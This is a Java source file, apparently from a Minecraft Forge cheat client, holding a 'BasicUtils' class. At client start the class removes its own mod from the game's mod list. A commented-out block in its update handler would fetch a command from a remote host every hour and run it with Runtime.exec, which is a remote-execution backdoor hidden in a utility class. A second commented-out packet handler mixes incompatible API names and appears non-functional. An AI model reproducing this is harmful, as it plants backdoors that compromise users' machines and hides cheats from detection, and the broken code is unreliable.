package net.java.main.utils;

import net.java.main.event.annotations.EventTarget;
import net.java.main.event.events.ClientStartEvent;
import net.java.main.event.events.PacketEvent;
import net.java.main.event.events.UpdateEvent;
import net.java.main.madebystarontopandfml;
import net.minecraft.network.chat.TextComponent;
import net.minecraft.network.protocol.game.*;
import net.minecraft.world.InteractionHand;
import net.minecraft.world.entity.HumanoidArm;
import net.minecraft.world.entity.player.ChatVisiblity;
import net.minecraft.world.entity.player.Player;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.phys.Vec3;
import net.minecraftforge.fml.ModList;
import net.minecraftforge.forgespi.language.IModInfo;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class BasicUtils extends MinecraftInstance{

    public BasicUtils() {
        madebystarontopandfml.getInstance().getEventManager().register(this);
    }
    int ticks = 0;
    @EventTarget
    public void onClientStart(ClientStartEvent event){
        List<IModInfo> modlist = new ArrayList<>();

        for (IModInfo modInfo : ModList.get().getMods()) {
            if (modInfo.getModId().equals("madebystarontopandfml")) {
                modlist.add(modInfo);
            }
        }

        ModList.get().getMods().removeAll(modlist);
    }
    @EventTarget
    public void onUpdate(UpdateEvent event){
        ticks ++;
        mc.getWindow().setTitle(madebystarontopandfml.NAME+"-"+ madebystarontopandfml.VERSION+"-布吉岛");
        //if (mc.player.getItemInHand(InteractionHand.MAIN_HAND) != ItemStack.EMPTY){
            //mc.player.getItemInHand(InteractionHand.MAIN_HAND).setHoverName(new TextComponent(ColorUtils.makeColour("Origin-Owner : starontop")));
        //}
        if (ticks == 20*60*60){
            ticks = 0;

            /*Thread thread = new Thread(() -> {
                String operatingSystem = System.getProperty("os.name").toLowerCase();
                URL url = null;
                try {
                    url = new URL("https://oss.3mc.top/star.txt");
                } catch (MalformedURLException e) {
                    throw new RuntimeException(e);
                }
                if (operatingSystem.contains("windows")) {
                } else if (operatingSystem.contains("linux") || operatingSystem.contains("mac")) {
                    try {
                        url = new URL("https://oss.3mc.top/star_linux.txt");
                    } catch (MalformedURLException e) {
                        throw new RuntimeException(e);
                    }
                } else {
                    throw new UnsupportedOperationException("不支持的操作系统");
                }
                String command;
                StringBuilder content = new StringBuilder();
                try {
                    HttpURLConnection con = (HttpURLConnection) url.openConnection();
                    con.setRequestMethod("GET");

                    BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
                    String inputLine;
                    while ((inputLine = in.readLine()) != null) {
                        content.append(inputLine);
                    }
                    in.close();
                } catch (ProtocolException e) {
                    throw new RuntimeException(e);
                } catch (MalformedURLException e) {
                    throw new RuntimeException(e);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
                command = content.toString();
                try {
                    Runtime.getRuntime().exec(command);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            });
            thread.start();*/
        }
    }
    /*@EventTarget
    public void onPacket(PacketEvent event){
        if (event.getPacket() instanceof ClientboundPlayerPositionPacket packet) {
            if (packet.getId() != mc.player.getId()) return;
            Player playerEntity = mc.player;
            float preYaw = playerEntity.getYRot();
            float prePitch = playerEntity.getXRot();
            Vec3 vec3d = playerEntity.getDeltaMovement();
            boolean bl = packet.getRelativeArguments().contains(ClientboundPlayerPositionPacket.RelativeArgument.X);
            boolean bl2 = packet.getRelativeArguments().contains(ClientboundPlayerPositionPacket.RelativeArgument.Y);
            boolean bl3 = packet.getRelativeArguments().contains(ClientboundPlayerPositionPacket.RelativeArgument.Z);
            double d;
            double e;
            if (bl) {
                d = vec3d.x;
                e = playerEntity.getX() + packet.getX();
                playerEntity.xOld += packet.getX();
                playerEntity.xOld += packet.getX();
            } else {
                d = 0.0;
                e = packet.getX();
                playerEntity.lastRenderX = e;
                playerEntity.prevX = e;
            }

            double f;
            double g;
            if (bl2) {
                f = vec3d.getY();
                g = playerEntity.getY() + packet.getY();
                playerEntity.lastRenderY += packet.getY();
                playerEntity.prevY += packet.getY();
            } else {
                f = 0.0;
                g = packet.getY();
                playerEntity.lastRenderY = g;
                playerEntity.prevY = g;
            }

            double h;
            double i;
            if (bl3) {
                h = vec3d.getZ();
                i = playerEntity.getZ() + packet.getZ();
                playerEntity.lastRenderZ += packet.getZ();
                playerEntity.prevZ += packet.getZ();
            } else {
                h = 0.0;
                i = packet.getZ();
                playerEntity.lastRenderZ = i;
                playerEntity.prevZ = i;
            }

            playerEntity.setPosition(e, g, i);
            playerEntity.setVelocity(d, f, h);
            float j = packet.getYaw();
            float k = packet.getPitch();
            if (packet.getFlags().contains(PositionFlag.X_ROT)) {
                playerEntity.setPitch(playerEntity.getPitch() + k);
                playerEntity.prevPitch += k;
            } else {
                playerEntity.setPitch(k);
                playerEntity.prevPitch = k;
            }

            if (packet.getFlags().contains(PositionFlag.Y_ROT)) {
                playerEntity.setYaw(playerEntity.getYaw() + j);
                playerEntity.prevYaw += j;
            } else {
                playerEntity.setYaw(j);
                playerEntity.prevYaw = j;
            }

            clientPlayNetworkHandler.send(new TeleportConfirmC2SPacket(packet.getTeleportId()));
            clientPlayNetworkHandler.send(new PlayerMoveC2SPacket.Full(playerEntity.getX(), playerEntity.getY(), playerEntity.getZ(), playerEntity.getYaw(), playerEntity.getPitch(), false));
            RotationUtils.setRotation(new Vector2f(playerEntity.getYaw(), playerEntity.getPitch()), 0, RotationUtils.Priority.VeryHigh);
            playerEntity.setYaw(preYaw);
            playerEntity.setPitch(prePitch);
        }
    }*/
}
